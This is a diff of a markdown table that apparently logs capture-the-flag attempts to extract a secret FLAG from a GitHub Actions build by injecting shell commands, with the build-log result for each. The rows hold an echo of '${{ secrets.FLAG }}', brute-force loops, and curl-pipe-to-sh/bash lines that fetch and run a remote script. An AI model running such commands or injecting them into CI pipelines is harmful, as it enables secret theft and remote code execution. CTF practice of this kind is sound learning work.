@@ -17,4 +17,5 @@ add | `for i in {00000..99999};echo $i`| ![截屏2021-09-16 上午11.32.51.png](
 add | `echo "secrets:${{ secrets.FLAG }}" >> issues` | build log:`echo "secrets:" >> issues` | unkown.
 add | `c=$(for i in {00000..99999};echo "[$i]")&&echo $c >> issues`| build log:<code>command substitution: line 2: syntax error near unexpected token `echo'</code> | unkown.
 add | `c=$(for i in {00000..99999};echo -e "[$i]")&&echo "$c" >> issues` | build log:<code>command substitution: line 2: syntax error near unexpected token `echo'</code> | unkown.
-add | <code>curl -sL https://raw.githubusercontent.com/Bin4xin/bigger-than-bigger/master/CTF/MISC/count.sh|sh</code> | ? | ?
+add | <code>curl -sL https://raw.githubusercontent.com/Bin4xin/bigger-than-bigger/master/CTF/MISC/count.sh %7C sh</code> | build log:`Process completed with exit code 1.` | ?
+add | <code>curl -sL https://raw.githubusercontent.com/Bin4xin/bigger-than-bigger/master/CTF/MISC/count.sh %7C bash</code> | ? | ?
